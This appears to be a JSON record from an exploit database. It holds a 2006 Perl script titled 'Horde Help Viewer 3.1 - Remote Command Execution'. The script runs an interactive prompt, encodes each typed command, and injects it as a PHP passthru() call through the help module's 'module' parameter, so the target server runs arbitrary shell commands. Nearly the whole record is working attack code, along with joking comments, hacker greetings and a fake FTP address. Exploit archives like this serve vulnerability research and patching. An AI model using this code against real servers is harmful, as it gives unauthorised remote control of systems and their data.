{
  "id": "1650",
  "title": "Horde Help Viewer 3.1 - Remote Command Execution",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl \r\n# Wed Apr  5 21:51:12 CEST 2006 jolascoaga@514.es\r\n#\r\n# Horde help module remote execution\r\n# \r\n# telnet 310.27.901.33.1109 1689 # thanks horatio for the address\r\n# USER paranoia\r\n# PASS total\r\n# SYST\r\n# REST 100\r\n# REST 0\r\n# PWD\r\n# TYPE A\r\n# PASV\r\n# LIST\r\n# CWD 0days\r\n# GET horddy.pl\r\n#\r\n# w0w this damn 0day ftp is so sexy!\r\n# \r\n# GO GO GO !! GO GO GO !! Team fall back!\r\n# \r\n# Example: ./horddy.pl --host=http://www.server.com/horde\r\n# \r\n# Now for your X-box !\r\n# \r\n# Greets:\r\n#  - all 514 crew \r\n#  - mallorca ppl r0xing.\r\n#\r\n# THIS IS PENE! TIMMY!!! LIVIN' A LIE!\r\n# \r\n \r\n\r\nuse strict;\r\nuse LWP::UserAgent;\r\nuse LWP::Simple;\r\nuse HTTP::Request;\r\nuse HTTP::Response;\r\nuse Getopt::Long;\r\n\r\n$| = 1;   # mess with the best? don't mess with my buffer\r\n\r\nmy ($proxy,$proxy_user,$proxy_pass);\r\nmy ($host,$debug,$dir, $command);\r\nmy $use_ssl = 0;\r\n\r\nmy $options = GetOptions (\r\n  'host=s'      => \\$host, \r\n  'dir=s'      => \\$dir,\r\n  'proxy=s'           => \\$proxy,\r\n  'proxy_user=s'      => \\$proxy_user,\r\n  'proxy_pass=s'      => \\$proxy_pass,\r\n  'debug'             => \\$debug);\r\n\r\n&help unless ($host); # please don't try this at home.\r\n\r\n$dir = \"/horde/\" unless($dir);\r\nprint \"$host - $dir\\n\";\r\n\r\nwhile () {\r\nprint \"horddy> \"; # lost connection\r\nwhile(<STDIN>) {\r\n$command=$_;\r\nchomp($command);\r\nlast;\r\n}\r\n&send($command);\r\n}\r\n\r\nsub buildcmd {# this is a useful comment\r\nmy ($cmd) = @_;\r\n# wonderful hacking\r\n$cmd =~ s/ /\\%20/gi;\r\n$cmd =~ s/\\//\\\"\\.chr\\(47\\)\\.\\\"/gi;\r\n\r\nreturn $cmd;\r\n}\r\n\r\nsub send {\r\n    my ($tmp) = @_;\r\n    my $ok=0;\r\n    my $cmd = buildcmd ($tmp); # this is really magic ^^\r\n    my $socket;\r\n    LWP::Debug::level('+') if $debug; # but remember this is crap :D\r\n\r\n    my $ua = new LWP::UserAgent();   \r\n    $ua->agent(\"Nozilla/P.N (Just for IDS woring)\"); # this is not me :/\r\n\r\n    my $string = \"/$dir/services/help/?show=about&module=;\\\".passthru(\\\"$cmd\\\");'.\";\r\n\r\n    if ($host !~ /^http/) {\r\n$host = sprintf (\"http://%s\", $host); # CRAP CRAP CRAP\r\n    }\r\n\r\n    my $req = HTTP::Request->new (GET => $host.$string);\r\n    $ua->proxy(['http'] => $proxy) if $proxy;\r\n    $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;\r\n\r\n    print $req->as_string() if $debug; \r\n\r\n    my $res = $ua->request($req);\r\n    my $html = $res->content(); \r\n\r\n    foreach (split(/\\n/,$html)) {\r\nif ((/<h2/) or (/<br \\/>/)) { # brum brum conditionals desmitified\r\nlast;\r\n}\r\nprint \"$_\\n\" if $ok eq \"1\"; # i don't think this is usefull \r\nif (/<body class=/) {\r\n$ok = 1;\r\n}  \r\n    }\r\n}\r\n\r\nsub help {\r\n    print \"Syntax: ./$0 --host=url --dir=/horde [options]\\n\";\r\n    print \"\\t--proxy (http), --proxy_user, --proxy_pass\\n\";\r\n    print \"\\t--debug\\n\";\r\n    print \"the default directory is /horde\\n\";\r\n    print \"\\nExample\\n\";\r\n    print \"bash# $0 --host=http(s)://www.server.com/\\n\";\r\n    print \"\\n\";\r\n    exit(1);\r\n}\r\nexit 0;\r\n# y00000w this is the best part.\r\n# remember mallorca es fonki :D\r\n\r\n# milw0rm.com [2006-04-07]",
  "url": "https://www.exploit-db.com/exploits/1650"
}